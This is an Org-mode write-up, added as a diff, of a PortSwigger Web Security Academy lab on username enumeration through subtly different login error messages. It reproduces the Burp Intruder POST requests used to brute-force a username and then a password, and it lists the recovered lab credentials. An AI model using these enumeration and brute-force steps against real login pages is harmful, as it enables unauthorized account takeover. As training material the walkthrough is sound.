@@ -1,0 +1,95 @@
+#+title: Username enumeration via subtly different responses
+#+author: [[https://github.com/touhidulshawan][Touhidul Shawan]]
+
+* Table of Contents :toc:
+- [[#lab-contains][Lab Contains]]
+- [[#end-goal][End Goal]]
+- [[#enumerate-username][Enumerate username]]
+- [[#enumerate-password][Enumerate password]]
+- [[#solve-the-lab][Solve the lab]]
+
+* Lab Contains
++ Subtly vulnerable to ~username~ enumeration and ~password~ brute-force attack
++ Wordlist for ~username~
++ Wordlist for ~password~
+* End Goal
++ Enumerate valid ~username~ and ~password~
++ Login with correct ~username~ and ~password~ to solve the lab
+
+* DONE Enumerate username
+CLOSED: [2023-07-31 Mon 19:33]
++ Go to login page of the application
++ Login with test credential like username = ~test~ , password = ~test~
++ Observe the behavior of the application
++ Like [[./lab1.org][Lab 1]] this application give generic error-message: ~Invalid username or password~
++ Now send the login request in intruder and brute-force with ~username~ payload.
+  #+begin_src shell
+    POST /login HTTP/2
+    Host: 0a1f00c703322a3180e1ee3a00c00050.web-security-academy.net
+    Cookie: session=xGhHhPvpCNnPiGzXeb55B7vznt5aCJiB
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 27
+    Origin: https://0a1f00c703322a3180e1ee3a00c00050.web-security-academy.net
+    Dnt: 1
+    Referer: https://0a1f00c703322a3180e1ee3a00c00050.web-security-academy.net/login
+    Upgrade-Insecure-Requests: 1
+    Sec-Fetch-Dest: document
+    Sec-Fetch-Mode: navigate
+    Sec-Fetch-Site: same-origin
+    Sec-Fetch-User: ?1
+    Sec-Gpc: 1
+    Te: trailers
+
+    username=§test§&password=test
+  #+end_src
+
+  + For all payload of ~username~ it gives same error-message which is ~Invalid username or password.~ but for one payload this error-message is subtly different which is ~Invalid username or password~ there is no '.' full stop mark. So assume that this might be our correct username for this lab instance is ~puppet~
+
+  [[./assets/screenshots/lab04-enum-username.png]]
+
+* DONE Enumerate password
+CLOSED: [2023-07-31 Mon 19:33]
++ Using username ~puppet~ now send login request to intruder again to brute-force password
+  #+begin_src shell
+    POST /login HTTP/2
+    Host: 0a1f00c703322a3180e1ee3a00c00050.web-security-academy.net
+    Cookie: session=xGhHhPvpCNnPiGzXeb55B7vznt5aCJiB
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 29
+    Origin: https://0a1f00c703322a3180e1ee3a00c00050.web-security-academy.net
+    Dnt: 1
+    Referer: https://0a1f00c703322a3180e1ee3a00c00050.web-security-academy.net/login
+    Upgrade-Insecure-Requests: 1
+    Sec-Fetch-Dest: document
+    Sec-Fetch-Mode: navigate
+    Sec-Fetch-Site: same-origin
+    Sec-Fetch-User: ?1
+    Sec-Gpc: 1
+    Te: trailers
+
+    username=puppet&password=§test§
+#+end_src
+
++ For all payload it gives ~Invalid username or password~ . For one payload it does not give error-message. So, this is the password for our user ~puppet~ which is ~12345~
+
+ [[./assets/screenshots/lab04-enum-password.png]] 
+
+ Note: This might change on every new instance of lab
+
+* DONE Solve the lab
+CLOSED: [2023-07-31 Mon 19:35]
+Now we enumerate our username and password for the application
+
+- username = ~puppet~
+- password = ~12345~
+
+/Now login with this credential and solve the lab/
+
